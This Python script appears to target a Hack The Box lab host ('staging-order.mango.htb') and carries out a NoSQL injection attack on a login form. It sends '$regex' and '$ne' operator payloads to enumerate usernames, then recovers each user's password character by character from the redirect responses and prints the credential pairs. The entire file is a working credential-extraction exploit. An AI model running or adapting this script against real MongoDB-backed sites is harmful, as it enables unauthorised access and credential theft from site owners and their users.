#!/usr/bin/python
import string
import requests
import sys
from colorama import Fore

# url of the site to attack
url = "http://staging-order.mango.htb"

# set up chars that can be in password (remove those chars that have a special meaning in regex)
chars = string.printable
for ch in string.printable:
	if ch in "$^&*|.+\?":
		chars = chars.replace(ch,'')

def findUsernames():
	print(Fore.GREEN + "-------- Searching for Usernames ------- ")
	
	userCandidates = []
	
	guesses = [""]
	
	while len(guesses) > 0:
		# do this loop until there's no guess left anymore
		for guess in guesses:	
			newGuesses = []
		
			for char in chars:
				par = {'username[$regex]' : "^" + guess + char + ".*", 'password[$ne]' : '1'}
				response = requests.post(url, data=par, allow_redirects=False)

				if response.status_code == 302:
					print(Fore.WHITE + "New candidate found: " + guess + char)
					newGuesses.append(guess+char)
			
			# after having tried all possible "name extensions", add the guess as a username and remove it from the guesses
			userCandidates.append(guess)	
			guesses.remove(guess)
			
			# add the new guesses to the list of guesses
			guesses += newGuesses
			
	
	# check if a candidate actually is a real username by checking if it has a password
	users = []

	for candidate in userCandidates:
		par = {'username' : candidate, 'password[$ne]' : '1'}
		response = requests.post(url, data=par, allow_redirects=False)
	

		if response.status_code == 302:
			print(Fore.YELLOW + "Username found: " + candidate)
			users.append(candidate)

	return users

def findPasswd(user):
	print('\n' + Fore.GREEN + "-------- Searching for Password of " + user + " ------- ")
	
	password = ""
	for first in chars:
		par = {'password[$regex]' : "^" + first + ".*", 'username' : user}
		response = requests.post(url, data=par, allow_redirects=False)
		

		if response.status_code == 302:
			# print(Fore.WHITE + "First character found: " + first)
			
			password += first
			finished = False
			

			while not finished:
				# assume that no more chars can be added to the current guess
				finished = True
				
				# check if more chars can be added
				for next in chars:
					par = {'password[$regex]' : "^" + password + next + ".*", 'username' : user}
					response = requests.post(url, data=par, allow_redirects=False)
					
					if response.status_code == 302:
						# another char was found, continue looking for further chars of the password
						finished = False
						password += next
						# print(Fore.WHITE + '-- Password so far: ' + password)
					
			# password found
			print(Fore.YELLOW + "[!] PASSWORD FOUND: " + password)
		
	return password


# find candidates for usernames first
users = findUsernames()

# find their passwords
passwords = []
for user in users:
	passwords.append((user,findPasswd(user)))

print('\n' + Fore.GREEN + "[***] SUCCESS!")
print("The following username:password combinations were found!")

counter = 1
for combination in passwords:
	print(Fore.YELLOW + str(counter) + ") Name: " + combination[0] +" -- Password: " + combination[1])
	counter += 1





